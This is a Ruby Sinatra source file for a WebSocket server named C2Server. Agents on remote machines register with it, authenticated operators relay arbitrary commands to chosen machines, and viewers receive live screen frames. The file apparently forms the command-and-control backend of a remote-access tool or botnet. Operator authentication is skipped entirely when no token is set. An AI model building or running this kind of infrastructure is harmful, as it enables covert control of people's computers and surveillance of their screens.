# typed: false
# frozen_string_literal: true

$stdout.sync = true
$stderr.sync = true

begin
  require "dotenv/load"
  require "sinatra/base"
  require "faye/websocket"
  require "json"
  require "rack/utils"

  require_relative "domain/entities/machine"
  require_relative "domain/services/machine_registry"

  class C2Server < Sinatra::Base
    set :server, :thin

    REGISTRY  = Domain::Services::MachineRegistry.new
    OPERATORS = Set.new
    VIEWERS   = T.let(Hash.new { |h, k| h[k] = Set.new }, T::Hash[String, T::Set[T.untyped]])
    TOKEN     = ENV.fetch("OPERATOR_TOKEN", "")

    get "/health" do
      content_type :json
      { status: "ok", machines: REGISTRY.count }.to_json
    end

    get "/" do
      unless Faye::WebSocket.websocket?(request.env)
        halt 400, "Not a WebSocket request"
      end

      ws  = Faye::WebSocket.new(request.env)
      ip  = request.ip
      role          = T.let(nil, T.nilable(Symbol))
      machine_id    = T.let(nil, T.nilable(String))
      viewer_target = T.let(nil, T.nilable(String))

      ws.on :message do |event|
        raw = event.data
        msg = begin
          JSON.parse(raw)
        rescue JSON::ParserError
          ws.send({ type: "error", error: "invalid JSON" }.to_json)
          next
        end

        type = msg["type"]

        # ── Handshake (first message sets the role) ──────────────────────
        if role.nil?
          case type
          when "register"
            role = :agent
            machine = Domain::Entities::Machine.create(
              name: msg["name"] || "unknown",
              os:   msg["os"]   || "unknown",
              ip:   msg["ip"]   || ip,
              ws:   ws,
            )
            machine_id = machine.id
            REGISTRY.register(machine)
            ws.send({ type: "registered", id: machine_id }.to_json)
            broadcast_operators({ "type" => "machine_connected", "machine" => machine.to_h_public })
            log "[+] Agent: #{machine.name} (#{machine_id})"

          when "operator"
            unless valid_token?(msg["token"] || "")
              ws.send({ type: "error", error: "unauthorized" }.to_json)
              ws.close
              next
            end
            role = :operator
            OPERATORS.add(ws)
            ws.send({ type: "welcome", machines: REGISTRY.all_public }.to_json)
            log "[+] Operator (total: #{OPERATORS.size})"

          when "viewer"
            target = msg["machine_id"]
            if target && REGISTRY.find(target)
              role = :viewer
              viewer_target = target
              VIEWERS[target].add(ws)
              ws.send({ type: "viewer_ok", machine_id: target }.to_json)
              log "[+] Viewer → #{target}"
            else
              ws.send({ type: "error", error: "machine not found" }.to_json)
            end

          else
            ws.send({ type: "error", error: "send register/operator/viewer first" }.to_json)
          end
          next
        end

        # ── Agent → relay to operators/viewers ───────────────────────────
        if role == :agent && machine_id
          if type == "screen_frame"
            relay_to_viewers(machine_id, msg)
          else
            broadcast_operators(msg.merge("machine_id" => machine_id))
          end
          next
        end

        # ── Operator → relay to target agent ─────────────────────────────
        if role == :operator
          target = msg.delete("machine_id")
          if target
            relay_to_agent(target, msg)
          else
            ws.send({ type: "error", error: "missing machine_id" }.to_json)
          end
          next
        end
      end

      ws.on :close do |_|
        case role
        when :agent
          if machine_id
            REGISTRY.unregister(machine_id)
            VIEWERS.delete(machine_id)
            broadcast_operators({ "type" => "machine_disconnected", "machine_id" => machine_id })
            log "[-] Agent: #{machine_id}"
          end
        when :operator
          OPERATORS.delete(ws)
          log "[-] Operator (remaining: #{OPERATORS.size})"
        when :viewer
          VIEWERS[viewer_target]&.delete(ws) if viewer_target
          log "[-] Viewer"
        end
      end

      ws.rack_response
    end

    private

    def self.broadcast_operators(payload)
      json = payload.to_json
      OPERATORS.each { |op| op.send(json) rescue nil }
    end

    def self.relay_to_agent(machine_id, payload)
      machine = REGISTRY.find(machine_id)
      machine&.ws&.send(payload.to_json) rescue nil
    end

    def self.relay_to_viewers(machine_id, payload)
      viewers = VIEWERS[machine_id]
      return if viewers.empty?
      json = payload.is_a?(String) ? payload : payload.to_json
      viewers.each { |v| v.send(json) rescue nil }
    end

    def self.valid_token?(token)
      return true if TOKEN.empty?
      Rack::Utils.secure_compare(TOKEN, token)
    end

    def self.log(msg)
      puts "[#{Time.now.strftime('%H:%M:%S')}] #{msg}"
    end

    # instance delegates to class methods
    def broadcast_operators(p) = self.class.broadcast_operators(p)
    def relay_to_agent(mid, p) = self.class.relay_to_agent(mid, p)
    def relay_to_viewers(mid, p) = self.class.relay_to_viewers(mid, p)
    def valid_token?(t) = self.class.valid_token?(t)
    def log(m) = self.class.log(m)
  end

rescue => e
  STDERR.puts "[FATAL] #{e.class}: #{e.message}"
  STDERR.puts e.backtrace&.first(10)&.join("\n")
  exit 1
end
